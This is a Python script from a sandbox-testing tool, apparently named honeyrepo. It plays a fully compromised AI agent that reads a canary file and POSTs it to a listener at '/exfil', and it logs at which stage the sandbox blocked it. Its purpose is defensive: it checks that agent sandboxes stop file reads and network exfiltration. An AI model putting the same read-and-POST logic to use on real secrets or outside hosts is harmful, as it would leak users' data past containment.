"""The fixed attacker used by built-in scenarios.

honeyrepo runs the source of this file with ``python -c`` inside your sandbox.
It plays a fully compromised agent: it reads a canary file and tries to POST it
to the listener. Before and after every step it prints one line that starts with
``HONEYREPO-STAGE `` and carries a JSON object, so honeyrepo can tell *where* the
attack stopped and why, instead of guessing from silence.

Steps:
  1. start    the attacker is running at all.
  2. control  it can read a harmless file in the bait repo. This is a positive
              control: if even that fails, the wrapper is broken and nothing can
              be said about the canary.
  3. read     it reads the canary file (an absolute path given by honeyrepo, so
              changing or unsetting HOME cannot redirect it to a real file).
  4. send     it connects to the listener and POSTs the canary. A refused,
              unreachable, timed-out or denied connection counts as "blocked".

Standard library only, and no imports from honeyrepo: inside a sandbox the
package may not be importable. Arguments: LISTENER_URL CANARY_FILE CONTROL_FILE NONCE.
"""

import errno
import http.client
import json
import sys

STAGE_PREFIX = "HONEYREPO-STAGE "
CONNECT_TIMEOUT = 5.0
ACK_PREFIX = "HONEYREPO-ACK "

_BLOCKING_ERRNOS = {
    errno.ECONNREFUSED,
    errno.ENETUNREACH,
    errno.EHOSTUNREACH,
    errno.ENETDOWN,
    errno.EACCES,
    errno.EPERM,
    errno.ETIMEDOUT,
    errno.EADDRNOTAVAIL,
    # Windows socket error numbers: refused, timed out, net down, net unreachable,
    # host unreachable, access denied, address not available.
    10061,
    10060,
    10050,
    10051,
    10065,
    10013,
    10049,
}


def emit(**fields) -> None:
    print(STAGE_PREFIX + json.dumps(fields, sort_keys=True), flush=True)


def describe(exc: BaseException) -> dict:
    code = exc.errno if isinstance(exc, OSError) else None
    return {
        "error": type(exc).__name__,
        "errno": code,
        "errno_name": errno.errorcode.get(code) if code is not None else None,
        "message": str(exc)[:200],
    }


def read_failure_kind(exc: OSError) -> str:
    """'denied' (the sandbox said no), 'missing' (the file is not visible) or 'other'."""
    if isinstance(exc, PermissionError):
        return "denied"
    if isinstance(exc, (FileNotFoundError, NotADirectoryError)):
        return "missing"
    return "other"


def is_network_block(exc: BaseException) -> bool:
    """True if a failed connect() looks like a sandbox or firewall refusing it."""
    if isinstance(exc, (ConnectionRefusedError, TimeoutError, PermissionError)):
        return True
    return isinstance(exc, OSError) and exc.errno in _BLOCKING_ERRNOS


def parse_listener(url: str) -> tuple[str, int]:
    host_port = url.split("//", 1)[1].rstrip("/")
    host, _, port = host_port.rpartition(":")
    return host, int(port)


def main(argv: list[str]) -> int:
    emit(stage="start")
    listener_url, canary_file, control_file, nonce = argv
    host, port = parse_listener(listener_url)

    try:
        with open(control_file, "rb") as handle:
            handle.read()
    except OSError as exc:
        emit(stage="control", ok=False, **describe(exc))
        return 0
    emit(stage="control", ok=True)

    try:
        with open(canary_file, "rb") as handle:
            data = handle.read()
    except OSError as exc:
        emit(stage="read", ok=False, kind=read_failure_kind(exc), **describe(exc))
        return 0
    emit(stage="read", ok=True)

    emit(stage="send", outcome="attempt")
    connection = http.client.HTTPConnection(host, port, timeout=CONNECT_TIMEOUT)
    try:
        try:
            connection.connect()
        except OSError as exc:
            outcome = "blocked" if is_network_block(exc) else "error"
            emit(stage="send", outcome=outcome, **describe(exc))
            return 0
        try:
            connection.request("POST", "/exfil", body=data, headers={"Content-Type": "text/plain"})
            response = connection.getresponse()
            reply = response.read(256)
        except (OSError, http.client.HTTPException) as exc:
            emit(stage="send", outcome="error", **describe(exc))
            return 0
        if reply.startswith((ACK_PREFIX + nonce).encode("ascii")):
            emit(stage="send", outcome="delivered", status=response.status)
        else:
            emit(stage="send", outcome="answered-by-other", status=response.status)
    finally:
        connection.close()
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
